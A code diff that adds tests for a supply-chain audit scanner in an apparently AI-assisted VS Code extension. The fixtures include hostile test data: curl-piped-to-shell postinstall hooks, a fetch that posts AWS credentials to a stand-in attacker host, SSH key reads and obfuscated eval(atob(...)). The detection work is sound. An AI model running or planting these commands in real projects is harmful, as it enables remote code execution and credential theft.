@@ -1027,6 +1027,146 @@ async function supplyChainSuite() {
       && !/workspaceState[^\n]{0,60}(_reviewKey|reviewedCommands)/.test(extSrc));
     check('personal commands are excluded from marking by origin, not by heuristic',
       /origin === 'personal'/.test(extSrc));
+
+
+  // ── /audit: scanning the PROJECT, not Navy's own commands. ───────────────
+  // The review gate above protects Navy from a repo; this turns the same eye
+  // on the repo. Navy's own code finds the signals deterministically; the model
+  // only triages the hits.
+  {
+    // Manifest scanners — where npm supply-chain attacks actually live.
+    const hook = sc.scanPackageJson(JSON.stringify({ scripts: { postinstall: 'curl https://evil.sh | bash', build: 'tsc' } }), 'package.json');
+    check('scan: a postinstall hook that pipes curl to a shell is HIGH',
+      hook.some(f => f.id === 'install-hook' && f.severity === 'high'), JSON.stringify(hook));
+    check('scan: a benign build script is not a finding',
+      !hook.some(f => f.match.includes('tsc')));
+    check('scan: a plain postinstall is noted (medium), not alarmed',
+      sc.scanPackageJson(JSON.stringify({ scripts: { postinstall: 'node ./scripts/build.js' } }), 'package.json')
+        .every(f => f.severity === 'medium'));
+    check('scan: a package.json with no install hooks flags nothing',
+      sc.scanPackageJson(JSON.stringify({ scripts: { test: 'jest' } }), 'package.json').length === 0);
+    check('scan: malformed package.json does not throw',
+      Array.isArray(sc.scanPackageJson('{ not json', 'package.json')));
+
+    const lock = sc.scanLockfile('"resolved": "git+https://github.com/attacker/pkg.git"\n"resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz"', 'yarn.lock');
+    check('scan: a git-URL dependency is flagged as off-registry',
+      lock.some(f => f.id === 'off-registry-dependency'));
+    check('scan: a normal registry URL is NOT flagged',
+      !lock.some(f => f.match.includes('registry.npmjs.org')));
+    check('scan: a funding/sponsor URL is NOT flagged — it is a donation link, not a source',
+      sc.scanLockfile('"url": "https://github.com/sponsors/someone"\\n"url": "https://opencollective.com/x"', 'package-lock.json').length === 0);
+
+    // classifyForScan decides what is even worth reading.
+    check('scan: package.json, lockfiles and source are recognised',
+      sc.classifyForScan('package.json') === 'package'
+      && sc.classifyForScan('yarn.lock') === 'lockfile'
+      && sc.classifyForScan('app.py') === 'source');
+    check('scan: a README or an image is not scanned',
+      sc.classifyForScan('README.md') === null && sc.classifyForScan('logo.png') === null);
+
+    // scanFile marks a recently-changed file, which the walk uses to sort.
+    const marked = sc.scanFile({ name: 'x.js', rel: 'src/x.js', content: 'const k = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa")', changed: true });
+    check('scan: a source-file finding carries its path and the changed flag',
+      marked.length > 0 && marked[0].file === 'src/x.js' && marked[0].changed === true);
+
+    // The source rules fire on CONSTRUCTS, not vocabulary — the whole reason
+    // they are not auditPrompt. These pin the line between signal and noise.
+    check('source scan: reading an SSH key in code is high-risk',
+      sc.scanSourceFile('const k = readFileSync("/home/u/.ssh/id_rsa")', 'a.js').some(f => f.id === 'credential-access'));
+    check('source scan: eval(atob(...)) is high-risk obfuscated execution',
+      sc.scanSourceFile('eval(atob("Y29uc29sZQ=="))', 'a.js').some(f => f.id === 'obfuscated-execution'));
+    check('source scan: curl | sh in code is remote execution',
+      sc.scanSourceFile('exec("curl https://x.sh | sh")', 'a.js').some(f => f.id === 'remote-execution'));
+    check('source scan: the WORD "silently" in a comment is NOT flagged — that was the noise',
+      sc.scanSourceFile('// retries silently on failure\\nconst x = 1;', 'a.js').length === 0);
+    check('source scan: a plain string mentioning .env is NOT flagged',
+      sc.scanSourceFile('const path = ".env";', 'a.js').length === 0);
+    check('source scan: a fetch to localhost is NOT suspicious',
+      sc.scanSourceFile('fetch("http://localhost:3000/api")', 'a.js').length === 0);
+    check('source scan: a fetch to an external host IS worth a glance (medium)',
+      sc.scanSourceFile('fetch("https://api.example.com/x")', 'a.js').some(f => f.id === 'suspicious-network' && f.severity === 'medium'));
+
+    // The summary the model is handed.
+    const summary = sc.summarizeScan([
+      { file: 'a', severity: 'low', id: 'external-package', why: 'x', match: 'npm i' },
+      { file: 'b', severity: 'high', id: 'exfiltration', why: 'x', match: 'curl' },
+      { file: 'c', severity: 'high', id: 'credentials', why: 'x', match: 'id_rsa', changed: true },
+    ], { scanned: 42 });
+    check('summary: worst-first, and changed-first within a severity',
+      summary.findings[0].file === 'c' && summary.findings[1].file === 'b' && summary.findings[2].file === 'a',
+      summary.findings.map(f => f.file).join(''));
+    check('summary: the headline counts by severity and files scanned',
+      /2 high/.test(summary.headline) && /42 file/.test(summary.headline), summary.headline);
+    check('summary: an empty scan reads as clean, not alarming',
+      /Nothing flagged/.test(sc.summarizeScan([], { scanned: 10 }).headline));
+
+    // The triage prompt hands the model the FINDINGS and forbids inventing more.
+    const tri = sc.scanTriagePrompt(summary);
+    check('triage prompt: lists the findings for the model to judge',
+      /exfiltration/.test(tri) && /credentials/.test(tri));
+    check('triage prompt: tells the model NOT to manufacture findings',
+      /not to invent|do not manufacture/i.test(tri));
+  }
+
+  // ── End to end through the real walk, on a real temp project. ────────────
+  {
+    const os = require('os');
+    let provider2, tmp2;
+    try {
+      const { NavyCoderViewProvider } = require('../src/extension.js');
+      tmp2 = fs.mkdtempSync(path.join(os.tmpdir(), 'navy-audit-'));
+      fs.writeFileSync(path.join(tmp2, 'package.json'),
+        JSON.stringify({ name: 'x', scripts: { postinstall: 'curl https://evil.example.com/x | sh' } }));
+      fs.mkdirSync(path.join(tmp2, 'src'), { recursive: true });
+      fs.writeFileSync(path.join(tmp2, 'src', 'clean.js'), 'export const add = (a, b) => a + b;');
+      fs.writeFileSync(path.join(tmp2, 'src', 'sneaky.js'), 'fetch("https://evil.example.com/collect", { method: "POST", body: readFileSync(HOME + "/.aws/credentials") })');
+      // A big generated file that must be skipped, not scanned.
+      fs.writeFileSync(path.join(tmp2, 'src', 'bundle.min.js'), 'x'.repeat(600 * 1024) + ' curl | bash');
+
+      provider2 = new NavyCoderViewProvider(makeContext(tmp2));
+      provider2.projectRoot = tmp2;
+      const posted2 = [];
+      provider2.view = { webview: { postMessage: (m) => { posted2.push(m); return Promise.resolve(true); } } };
+      // The triage turn would call the model; stub askNavy so the test stays offline.
+      let triaged = null;
+      provider2.askNavy = async (p) => { triaged = p; };
+
+      const result = await provider2.runProjectAudit();
+      check('audit e2e: the scan found the postinstall AND the exfiltration',
+        result && result.total >= 2
+        && result.findings.some(f => f.id === 'install-hook')
+        && result.findings.some(f => f.file.includes('sneaky.js')),
+        JSON.stringify(result && result.findings.map(f => f.file + ':' + f.id)));
+      check('audit e2e: the clean file produced no findings',
+        !result.findings.some(f => f.file.includes('clean.js')));
+      check('audit e2e: a file over the size cap is skipped, not scanned',
+        !result.findings.some(f => f.file.includes('bundle.min.js')), 'bundle should be skipped');
+      check('audit e2e: the panel gets a result card before any model call',
+        posted2.some(m => m.type === 'auditResult' && /high/.test(m.headline)));
+      check('audit e2e: the model is asked to triage, and only after the scan',
+        typeof triaged === 'string' && /supply-chain security scan/.test(triaged));
+
+      // A clean project spends no model call.
+      const clean = fs.mkdtempSync(path.join(os.tmpdir(), 'navy-audit-clean-'));
+      fs.writeFileSync(path.join(clean, 'package.json'), JSON.stringify({ name: 'ok', scripts: { test: 'jest' } }));
+      const p3 = new NavyCoderViewProvider(makeContext(clean));
+      p3.projectRoot = clean;
+      const posted3 = [];
+      p3.view = { webview: { postMessage: (m) => { posted3.push(m); return Promise.resolve(true); } } };
+      let called3 = false;
+      p3.askNavy = async () => { called3 = true; };
+      const cleanResult = await p3.runProjectAudit();
+      check('audit e2e: a clean project reports clean and spends NO model call',
+        cleanResult && cleanResult.total === 0 && called3 === false
+        && posted3.some(m => m.type === 'auditResult'));
+      try { p3.dispose?.(); } catch {}
+      try { fs.rmSync(clean, { recursive: true, force: true }); } catch {}
+    } finally {
+      try { provider2?.dispose?.(); } catch {}
+      try { if (tmp2) fs.rmSync(tmp2, { recursive: true, force: true }); } catch {}
+    }
+  }
+
   } finally {
     ctrl.reset?.();
     try { provider?.dispose?.(); } catch {}
